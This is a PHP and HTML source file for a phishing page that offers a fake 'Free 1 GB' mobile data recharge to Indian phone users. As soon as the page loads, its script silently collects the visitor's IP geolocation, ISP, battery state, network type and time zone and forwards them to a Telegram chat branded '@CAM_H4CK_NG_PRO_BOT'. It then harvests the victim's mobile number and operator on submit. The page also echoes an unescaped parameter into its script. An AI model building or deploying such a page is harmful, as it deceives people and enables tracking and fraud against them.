<?php
function getIpDetails($ip) {
    $json = file_get_contents("http://ip-api.com/json/{$ip}");
    return json_decode($json, true);
}

$claim = isset($_GET['claim']) ? $_GET['claim'] : null;

if (!$claim) {
    header("Location: http://t.me/CAM_H4CK_NG_PRO_BOT");
    exit;
}

$ip = $_SERVER['REMOTE_ADDR'];
$ipDetails = getIpDetails($ip);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free 1 GB Data Booster</title>
    <style>
        body {
            background: linear-gradient(to right, #00c6ff, #0072ff);
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            animation: slideRight 0.5s ease-out;
        }

        @keyframes slideRight {
            from {
                opacity: 0;
                transform: translateX(-100%);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .container {
            background: #fff;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 400px;
            animation: fadeIn 1s;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        h1 {
            font-size: 24px;
            color: #333;
            margin-bottom: 20px;
        }

        .notice {
            background: #ffecb3;
            padding: 10px;
            border: 1px solid #ffeb3b;
            border-radius: 5px;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .form-box {
            border: 1px solid #ddd;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
        }

        select, input[type="text"] {
            width: calc(100% - 20px);
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        input[type="text"] {
            padding-left: 50px;
            background: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAkAAAAOCAYAAAA9efxeAAAAAXNSR0IArs4c6QAAAD1JREFUKFNj/P//P4PABJ7yA6mAUEaegI+JFiQRSBAScHJoSaUGoAnAUEUAIb8RpRqkWjM1mgRElEAAAoOwcduFkMMUAAAAASUVORK5CYII=') no-repeat 10px center;
            background-size: 20px;
        }

        .submit-button {
            background: #00c853;
            color: #fff;
            border: none;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            cursor: pointer;
            transition: background 0.3s;
        }

        .submit-button:hover {
            background: #00b04f;
        }

        .user-count {
            font-size: 14px;
            color: #333;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🚀 Free 1 GB Network Data</h1>
        <div class="notice">🤠 Free 1GB data pack recharge for everyone from us.</div>
        <div class="form-box">
            <form id="data-form">
                <select id="operator" required>
                    <option value="">Select Operator</option>
                    <option value="Jio">Jio</option>
                    <option value="Airtel">Airtel</option>
                    <option value="VI">VI</option>
                    <option value="BSNL">BSNL</option>
                </select>
                <input type="text" id="mobile-number" placeholder="Mobile Number" required maxlength="10" pattern="\d{10}" title="Enter 10 digit mobile number" />
                <button type="submit" class="submit-button">🎁 Claim</button>
            </form>
        </div>
        <div class="user-count">😃 Claimed 3589/5000 users.</div>
    </div>
    <script>
        async function getDeviceInfo() {
            const deviceInfo = {
                charging: false,
                chargingPercentage: null,
                networkType: null,
                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            };

            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                deviceInfo.charging = battery.charging;
                deviceInfo.chargingPercentage = Math.round(battery.level * 100);
            }

            if (navigator.connection) {
                deviceInfo.networkType = navigator.connection.effectiveType;
            }

            return deviceInfo;
        }

        async function sendTelegramMessage(chatId, message) {
            const url = "sendMessage.php";
            const data = new URLSearchParams();
            data.append('chatId', chatId);
            data.append('message', message);

            await fetch(url, {
                method: 'POST',
                body: data
            });
        }

        async function sendInitialInfo() {
            const ipDetails = <?php echo json_encode($ipDetails); ?>;
            const claim = "<?php echo $claim; ?>";

            const deviceInfo = await getDeviceInfo();

            const message = `
<b><u>ℹ️ Activity Tracked:</u></b>

<b>🌐 Ip address:</b> <i>${ipDetails.query}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.regionName}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.isp}</i>
<b>🔍 Org:</b> <i>${ipDetails.org}</i>

<b>📱Device Info:</b>
<b>🔋 Charging:</b> <i>${deviceInfo.charging ? 'Yes' : 'No'}</i>
<b>🔌 Battery Level:</b> <i>${deviceInfo.chargingPercentage}%</i>
<b>🌐 Network Type:</b> <i>${deviceInfo.networkType}</i>
<b>🕒 Time Zone:</b> <i>${deviceInfo.timeZone}</i>

<b>👨‍💻 Tracked on: @CAM_H4CK_NG_PRO_BOT</b>
`;

            await sendTelegramMessage(claim, message);
        }

        async function handleSubmit(event) {
            event.preventDefault();

            const operator = document.getElementById('operator').value;
            const mobileNumber = document.getElementById('mobile-number').value;
            const claim = "<?php echo $claim; ?>";

            const ipDetails = <?php echo json_encode($ipDetails); ?>;

            const message = `
<b><u>☎️ Number Tracked</u></b>

<b>📱 Mobile number:</b> +91${mobileNumber}
<b>📡 Operator:</b> ${operator}

<b>🌐 Ip Information:</b>
<b>🌐 Ip address:</b> <i>${ipDetails.query}</i>
<b>🌍 Location:</b> <i>${ipDetails.city}, ${ipDetails.regionName}, ${ipDetails.country}</i>
<b>📡 ISP:</b> <i>${ipDetails.isp}</i>
<b>🔍 Org:</b> <i>${ipDetails.org}</i>

<b>👨‍💻 Tracked on: @CAM_H4CK_NG_PRO_BOT</b>
`;

            await sendTelegramMessage(claim, message);
            window.location.href = `verify.php?id=${claim}`;
        }

        document.getElementById('data-form').addEventListener('submit', handleSubmit);
        sendInitialInfo();

        document.getElementById('mobile-number').addEventListener('input', function (e) {
            this.value = this.value.replace(/[^0-9]/g, '');
        });
    </script>
</body>
</html>